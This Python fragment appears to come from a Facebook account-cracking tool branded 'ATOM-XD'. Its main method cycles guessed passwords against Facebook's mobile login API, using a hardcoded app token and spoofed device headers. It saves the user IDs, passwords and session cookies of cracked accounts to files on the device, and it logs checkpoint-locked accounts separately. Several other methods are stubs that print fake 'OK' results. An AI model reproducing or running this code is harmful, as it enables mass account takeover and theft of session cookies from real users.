    	        if __methX__ in ("1"):__seaaXX__.submit(self.___M1X___,ids,psd,tl)
    	        elif __methX__ in ("2"):__seaaXX__.submit(self.___M2X___,ids,psd,tl)
    	        elif __methX__ in ("3"):__seaaXX__.submit(self.___M3X___,ids,psd,tl)
    	        elif __methX__ in ("4"):__seaaXX__.submit(self.___M4X___,ids,psd,tl)
    	        elif __methX__ in ("5"):__seaaXX__.submit(self.___M5X___,ids,psd,tl)
    	        elif __methX__ in ("6"):__seaaXX__.submit(self.___M6X___,ids,psd,tl)
    	        elif __methX__ in ("7"):self.__normalX__()
    	        elif __methX__ in ("8"):self.__normalX__()
    	        else:__seaaXX__.submit(self.___M1X___,ids,psd,tl)
    	print('\033[1;37m');print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f'{xp} THE PROCESS HAS COMPLETED...');print(f'{xp} TOTAL {G}OK{W}/{R}CP {xpxx}{G} '+str(len(self.oks))+f'{W}/{R}'+str(len(self.cps)));print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');self.__exitX__()
#__________/NORMAL\__________#
    def __normalX__(self):
    	print(f"{xp} ")
#__________/RANDOM-M1\__________#
    def ___M1X___(self,ids,psd,tl):
        global loop,oks,cps
        color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r{xp}{W}-{W}/{color}ATOM-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
        try:
            for pas in psd:
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                data = {'adid':adid,'format':'json','device_id':device_id,
                'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown',
                'User-Agent': self.__UDP__(),
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                url = 'https://b-graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    uid = po['uid']
                    coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                    print(f'\r{xp}{W}-{R}/{G}ATOM-OK{R}/{G} {str(uid)} {R}/{G} {pas} ')
                    print(f'\r{xp}{W}-{R}/{G}💚{R}/{G} '+coki);print(f'\r{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/ATOM-XD/RANDOM/ATOM-M1-RANDOM-OK.txt','a').write(str(uid)+'/'+pas+'/sb=Cracked.By-Dip_Tool;'+coki+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f'\r\r{xp}{W}-{R}/{Y}ATOM-CP{R}/{Y}'+ids+' | '+pas+'\033[1;37m')
                    open('/sdcard/ATOM-XD/RANDOM/ATOM-M1-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
#__________/RANDOM-M2\__________#
    def ___M2X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M3\__________#
    def ___M3X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M4\__________#
    def ___M4X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M5\__________#
    def ___M5X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M6\__________#
    def ___M6X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M7\__________#
    def ___M7X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/RANDOM-M8\__________#
    def ___M8X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}ATOM-OK{W}/{G} {ids} {W}/{G} {pas}")
#__________/GMAIL\__________#
#__________/OLD\__________#
#__________/AUTO\__________#
#__________/END-CALL\__________#
__seaX__().__menuX__()